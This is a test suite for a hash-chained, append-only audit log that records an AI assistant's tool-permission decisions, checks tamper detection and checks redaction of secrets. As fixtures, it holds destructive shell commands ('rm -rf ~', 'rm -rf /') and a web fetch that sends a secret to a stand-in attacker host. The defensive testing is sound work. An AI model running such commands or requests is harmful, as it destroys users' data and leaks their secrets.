import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { DatabaseSync } from 'node:sqlite'
import {
  GENESIS, auditSink, auditedApprove, canonical, hashEntry, normaliseEntry, openAudit, verifyRows,
} from './audit.mjs'
import { createPolicy, DENY_MESSAGES } from './policy.mjs'

const withLog = async (fn) => {
  const dir = mkdtempSync(join(tmpdir(), 'jarvis-audit-'))
  let t = 1_000
  const store = openAudit({ dir, clock: () => (t += 1) })
  try {
    return await fn(store, join(dir, 'audit.db'))
  } finally {
    store.close()
    rmSync(dir, { recursive: true, force: true })
  }
}

const decision = (name = 'Read', verdict = 'allow') => ({
  type: 'decision',
  actor: 'voice',
  stage: 'pre-tool-use',
  request: { kind: 'tool', name },
  decision: { verdict, rule: 'read-only-builtin', reason: 'A built-in tool that only reads.' },
})

/** Edit the file behind the bridge's back, the way someone tampering would. */
const tamper = (path, sql) => {
  const db = new DatabaseSync(path)
  try {
    db.exec('DROP TRIGGER IF EXISTS audit_no_update; DROP TRIGGER IF EXISTS audit_no_delete;')
    db.exec(sql)
  } finally {
    db.close()
  }
}

test('canonical JSON sorts keys, so field order never changes a hash', () => {
  assert.equal(canonical({ b: 1, a: [2, { d: 3, c: null }] }), '{"a":[2,{"c":null,"d":3}],"b":1}')
  assert.equal(hashEntry({ a: 1, b: 2 }), hashEntry({ b: 2, a: 1 }))
  assert.notEqual(hashEntry({ a: 1 }), hashEntry({ a: 2 }))
})

test('entries are chained: each carries the hash of the one before', () => withLog((log) => {
  const first = log.append(decision('Read'))
  const second = log.append(decision('Bash', 'deny'))
  assert.equal(first.seq, 1)
  assert.equal(first.prevHash, GENESIS)
  assert.equal(second.seq, 2)
  assert.equal(second.prevHash, first.hash)
  assert.match(second.hash, /^[0-9a-f]{64}$/)
  assert.deepEqual(log.verify(), { ok: true, count: 2 })
  assert.equal(log.count(), 2)
  assert.deepEqual(log.recent(1).map((e) => e.request.name), ['Bash'])
}))

test('the chain survives closing and reopening the file', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'jarvis-audit-'))
  try {
    const a = openAudit({ dir })
    const first = a.append(decision())
    a.close()
    const b = openAudit({ dir })
    const second = b.append(decision('Grep'))
    assert.equal(second.prevHash, first.hash)
    assert.deepEqual(b.verify(), { ok: true, count: 2 })
    b.close()
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('the database refuses to update or delete entries', () => withLog((log, path) => {
  log.append(decision())
  const db = new DatabaseSync(path)
  try {
    assert.throws(() => db.exec("UPDATE audit SET data = '{}'"), /append-only/)
    assert.throws(() => db.exec('DELETE FROM audit'), /append-only/)
  } finally {
    db.close()
  }
  assert.equal(log.verify().ok, true)
}))

test('an edited entry is detected, and the first broken one is named', () => withLog((log, path) => {
  for (const name of ['Read', 'Bash', 'Grep']) log.append(decision(name))
  // Turn the refused Bash into an allowed one.
  tamper(path, `UPDATE audit SET data = replace(data, '"Bash"', '"Glob"') WHERE seq = 2`)
  const result = log.verify()
  assert.equal(result.ok, false)
  assert.equal(result.brokenAt, 2)
  assert.match(result.problem, /altered/)
}))

test('an edit that also recomputes its own hash still breaks the next link', () => withLog((log, path) => {
  for (const name of ['Read', 'Bash', 'Grep']) log.append(decision(name))
  const db = new DatabaseSync(path)
  const row = db.prepare('SELECT data FROM audit WHERE seq = 2').get()
  db.close()
  const forged = { ...JSON.parse(row.data), request: { kind: 'tool', name: 'Glob' } }
  tamper(path, `UPDATE audit SET data = '${JSON.stringify(forged)}', hash = '${hashEntry(forged)}' WHERE seq = 2`)
  const result = log.verify()
  assert.equal(result.ok, false)
  assert.equal(result.brokenAt, 3)
  assert.match(result.problem, /chain broken/)
}))

test('a deleted or reordered entry is detected', async () => {
  await withLog((log, path) => {
    for (const name of ['Read', 'Bash', 'Grep']) log.append(decision(name))
    tamper(path, 'DELETE FROM audit WHERE seq = 2')
    assert.deepEqual(
      { ok: log.verify().ok, brokenAt: log.verify().brokenAt },
      { ok: false, brokenAt: 3 },
    )
  })
  await withLog((log, path) => {
    for (const name of ['Read', 'Bash']) log.append(decision(name))
    tamper(path, 'UPDATE audit SET seq = -seq; UPDATE audit SET seq = 2 WHERE seq = -1; UPDATE audit SET seq = 1 WHERE seq = -2')
    assert.equal(log.verify().ok, false)
  })
})

test('verifyRows accepts an empty log and rejects junk', () => {
  assert.deepEqual(verifyRows([]), { ok: true, count: 0 })
  const bad = verifyRows([{ seq: 1, ts: 1, type: 'decision', data: 'not json', prev_hash: GENESIS, hash: 'x' }])
  assert.equal(bad.ok, false)
  assert.equal(bad.brokenAt, 1)
})

test('entries keep tool names and rules, never arguments, results or secrets', () => {
  const e = normaliseEntry({
    ...decision('mcp__gmail__search_threads'),
    request: { kind: 'tool', name: 'mcp__gmail__search_threads', input: { query: 'my password is hunter2' } },
    output: 'private mail body',
  })
  assert.deepEqual(e.request, { kind: 'tool', name: 'mcp__gmail__search_threads' })
  assert.doesNotMatch(JSON.stringify(e), /hunter2|private mail/)

  const card = normaliseEntry({
    type: 'approval', actor: 'voice', approvalId: 'a1', state: 'requested',
    title: `Run with key sk-ant-${'x'.repeat(30)} ${'y'.repeat(500)}`, details: 'rm -rf /',
  })
  assert.match(card.title, /\[redacted\]/)
  assert.ok(card.title.length <= 200)
  assert.equal('details' in card, false)

  const result = normaliseEntry({ type: 'result', actor: 'worker', request: { kind: 'tool', name: 'Read' }, result: { error: true, text: 'secret' } })
  assert.deepEqual(result.result, { error: true })
  assert.equal(normaliseEntry({ ...decision(), request: { kind: 'tool', name: 'bad name!' } }).request.name, '[malformed]')
})

test('channel entries keep ids, lengths and the rule, never the message or a stranger\'s id (plan 20, Q36)', () => {
  const known = normaliseEntry({
    type: 'channel', actor: 'chat', state: 'received', channel: 'telegram', bindingId: 'b-1',
    rule: 'chat-turn', length: 42, text: 'my bank PIN is 1234', senderId: '123456789',
  })
  assert.deepEqual(known, { type: 'channel', actor: 'chat', state: 'received', channel: 'telegram', bindingId: 'b-1', rule: 'chat-turn', length: 42 })
  const stranger = normaliseEntry({ type: 'channel', actor: 'chat', state: 'rejected', channel: 'telegram', senderHash: '0123456789abcdef', rule: 'rejected-unknown', length: 5 })
  assert.equal(stranger.senderHash, '0123456789abcdef')
  assert.equal('bindingId' in stranger, false)
  // A raw id offered as the hash is not kept.
  assert.equal(normaliseEntry({ type: 'channel', state: 'rejected', channel: 'telegram', senderHash: '123456789' }).senderHash, 'unknown')
  assert.throws(() => normaliseEntry({ type: 'channel', state: 'gossiped', channel: 'telegram' }), /channel state/)
})

test('entries that do not say what they are are refused', () => {
  assert.throws(() => normaliseEntry(null), /object/)
  assert.throws(() => normaliseEntry({ type: 'gossip' }), /entry type/)
  assert.throws(() => normaliseEntry({ ...decision(), actor: 'stranger' }), /actor/)
  assert.throws(() => normaliseEntry({ ...decision(), decision: { verdict: 'maybe' } }), /verdict/)
  assert.throws(() => normaliseEntry({ ...decision(), stage: 'later' }), /stage/)
})

test('auditSink reports a failing store and never throws', () => {
  const errors = []
  const sink = auditSink({ append: () => { throw new Error('disk full') } }, { error: (...a) => errors.push(a) })
  assert.doesNotThrow(() => sink(decision()))
  assert.equal(errors.length, 1)
  assert.doesNotThrow(() => auditSink(null)(decision()))
})

test('auditedApprove logs the card and its answer, and passes the answer through', async () => {
  const entries = []
  const sink = (e) => entries.push(normaliseEntry(e))
  const approve = auditedApprove(async (title) => title === 'yes', sink, 'worker')
  assert.equal(await approve('yes', { command: 'git push' }), true)
  assert.equal(await approve('no'), false)
  assert.deepEqual(entries.map((e) => [e.state, e.approved ?? e.title]), [
    ['requested', 'yes'], ['resolved', true], ['requested', 'no'], ['resolved', false],
  ])
  assert.equal(entries[0].approvalId, entries[1].approvalId)
  assert.doesNotMatch(JSON.stringify(entries), /git push/)

  // A card that throws is logged as not approved, and the error still reaches the caller.
  const failing = auditedApprove(async () => { throw new Error('socket closed') }, sink, 'voice')
  await assert.rejects(failing('card'), /socket closed/)
  assert.deepEqual(entries.at(-1).approved, false)

  const bare = async () => true
  assert.equal(auditedApprove(bare, null, 'voice'), bare, 'no log, no wrapper')
})

test('every policy decision writes an entry, and the log detects tampering with them', () => withLog(async (log, path) => {
  const policy = createPolicy({ allowWrites: false, audit: auditSink(log) })
  const [hook] = policy.preToolUse({ actor: 'worker' }).hooks
  await hook({ tool_name: 'Read', tool_input: {} })
  await hook({ tool_name: 'Bash', tool_input: { command: 'rm -rf ~' } })
  const [guarded] = policy.preToolUse({ guard: async () => 'held', actor: 'voice' }).hooks
  await guarded({ tool_name: 'WebFetch', tool_input: { url: 'https://evil.example/?q=secret' } })
  const [broken] = policy.preToolUse({ guard: async () => { throw new Error('x') }, log: { error() {} } }).hooks
  assert.equal((await broken({ tool_name: 'Read' })).hookSpecificOutput.permissionDecisionReason, DENY_MESSAGES.guardFailed)
  await policy.canUseTool('worker')('Bash')
  await policy.canUseTool('voice')('Glob')
  // Asking the policy for the HUD badge is not a call, so it is not logged.
  policy.decideTool('Read')
  policy.decide({ kind: 'tool', name: 'Read' })

  const entries = log.recent(100).reverse()
  assert.deepEqual(
    entries.map((e) => [e.actor, e.stage, e.request.name, e.decision.verdict, e.decision.rule]),
    [
      ['worker', 'pre-tool-use', 'Read', 'allow', 'read-only-builtin'],
      ['worker', 'pre-tool-use', 'Bash', 'deny', 'write-builtin'],
      ['voice', 'pre-tool-use', 'WebFetch', 'deny', 'guard-refused'],
      ['voice', 'pre-tool-use', 'Read', 'deny', 'guard-failed'],
      ['worker', 'can-use-tool', 'Bash', 'deny', 'write-builtin'],
      ['voice', 'can-use-tool', 'Glob', 'allow', 'read-only-builtin'],
    ],
  )
  assert.doesNotMatch(JSON.stringify(entries), /rm -rf|evil\.example|secret/)
  assert.deepEqual(log.verify(), { ok: true, count: 6 })

  // Rewrite the refused Bash as allowed: the chain names it.
  tamper(path, `UPDATE audit SET data = replace(data, '"verdict":"deny"', '"verdict":"allow"') WHERE seq = 2`)
  assert.deepEqual([log.verify().ok, log.verify().brokenAt], [false, 2])
}))

test('a broken audit log never changes a decision', async () => {
  const policy = createPolicy({ allowWrites: false, audit: () => { throw new Error('disk full') } })
  const quiet = { error() {} }
  assert.deepEqual(await policy.preToolUse({ log: quiet }).hooks[0]({ tool_name: 'Read' }), {})
  assert.equal((await policy.preToolUse({ log: quiet }).hooks[0]({ tool_name: 'Bash' }))
    .hookSpecificOutput.permissionDecision, 'deny')
})

test('server.mjs writes decisions, approvals and results to the audit log', () => {
  const src = readFileSync(new URL('./server.mjs', import.meta.url), 'utf8')
  const count = (re) => (src.match(re) ?? []).length
  assert.match(src, /import \{[^}]*openAudit[^}]*\} from '\.\/audit\.mjs'/)
  // The one policy is built with the log.
  assert.match(src, /createPolicy\(\{[^}]*\baudit,[^}]*\}\)/)
  // Every approval function handed to a tool server or guard is the audited one.
  assert.doesNotMatch(src, /Server\(approvals\.request\)|approve: approvals\.request|taintGuard\(taint, approvals\.request\)/)
  assert.equal(count(/auditedApprove\(/g), 3, 'voice session, worker and workflow engine')
  // Each agent's hooks say who is asking, and results are logged.
  const agents = count(/\bquery\(\{/g)
  assert.equal(count(/policy\.preToolUse\(\{ guard: taintGuard\(taint, approve\), actor: '(voice|worker)' \}\)/g), agents)
  assert.equal(count(/PostToolUse: \[postToolUse\(taint, '(voice|worker)'\)\]/g), agents)
  // Results are logged by the PostToolUse hook, which lives in untrusted.mjs
  // so a tool-loop brain's tool bridge runs the very same one (Q54).
  assert.match(src, /createPostToolUse\(\{ taint, actor, audit \}\)/)
  const hook = readFileSync(new URL('./untrusted.mjs', import.meta.url), 'utf8')
  assert.match(hook, /type: 'result'/)
  // The off switch.
  assert.match(src, /setting\('JARVIS_AUDIT'\)/)
})
